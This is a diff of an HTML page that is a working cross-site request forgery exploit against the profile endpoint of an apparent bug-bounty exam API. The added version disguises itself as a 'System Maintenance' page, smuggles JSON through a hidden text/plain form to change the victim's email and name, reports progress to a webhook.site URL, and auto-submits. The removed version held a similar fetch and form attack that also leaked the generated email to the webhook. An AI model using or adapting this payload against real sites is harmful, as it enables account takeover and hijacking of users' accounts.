@@ -1,36 +1,23 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h1>System Maintenance - Please Wait...</h1>
+    <form id="exploitForm" action="https://api-bugbounty-exam.hashacademy.co/api/auth/profile" method="POST" enctype="text/plain">
+        <input type="hidden" name='{"fullName":"Admin_Pwned","email":"pwned_admin_final_v1@attack.com","ignore":"' value='"}'>
+    </form>
+
     <script>
-        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
-        const newEmail = "hacker" + Math.floor(Math.random() * 9999) + "@attack.com";
+        const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
+        
+        // 1. Log that we are launching the final form attack
+        fetch(webhook + "?status=launching_form_ato");
 
-        // Attack 1: Standard Fetch (Background)
-        fetch(target, {
-            method: "PATCH",
-            headers: { "Content-Type": "application/json" }, // Try strict JSON
-            body: JSON.stringify({
-                "email": newEmail,
-                "fullName": "PWNED"
-            })
-        });
-
-        // Attack 2: HTML Form (Bypasses many security restrictions)
-        const form = document.createElement('form');
-        form.method = 'POST'; // Some APIs allow POST to act as PATCH
-        form.action = target;
-        
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = 'email';
-        input.value = newEmail;
-        
-        form.appendChild(input);
-        document.body.appendChild(form);
-        
-        // Final Step: Log the email to your webhook so you know which one to use!
-        fetch("https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283?attempting_email=" + newEmail)
-        .then(() => form.submit());
+        // 2. We use a trick: some APIs allow _method=PATCH in a POST request
+        // or just accept the POST to the profile endpoint.
+        // We submit the form after a tiny delay
+        setTimeout(() => {
+            document.getElementById('exploitForm').submit();
+        }, 500);
     </script>
 </body>
 </html>
